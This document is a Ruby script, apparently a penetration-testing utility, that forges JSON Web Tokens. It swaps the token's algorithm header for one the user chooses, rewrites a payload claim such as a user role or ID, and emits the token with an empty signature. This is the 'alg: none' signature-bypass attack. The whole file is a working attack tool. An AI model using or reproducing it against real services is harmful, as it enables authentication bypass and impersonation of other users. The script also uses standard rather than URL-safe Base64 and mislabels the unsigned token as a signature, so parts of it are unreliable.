#!/usr/bin/ruby

require 'base64'
require 'openssl'

puts "Enter the JWT Token: "
STDOUT.flush  
jwt = gets.chomp

header, payload, signature = jwt.split('.')
puts "\n"

decoded_header = Base64.decode64(header)
puts "Enter the name of existing algorithm: "
existingalgo = gets.chomp
puts "\n"
puts "Enter the new algorithm: "
newalgo = gets.chomp
puts "\n"
decoded_header.gsub!(existingalgo, newalgo)
puts "The new header is: "+ decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=", "")
puts "\n"

decoded_payload = Base64.decode64(payload)
puts "Enter the existing value of claim you want to change in Payload Section: "
existing = gets.chomp
puts "\n"
puts "Enter the new value of claim you want to use in Payload Section: "
new = gets.chomp
puts "\n"
decoded_payload.gsub!(existing, new)
puts "The new payload is: "+decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=", "")
puts "\n"

data = new_header+"."+new_payload+"."

puts "The new JWT signature is: "+ data
puts "\n"
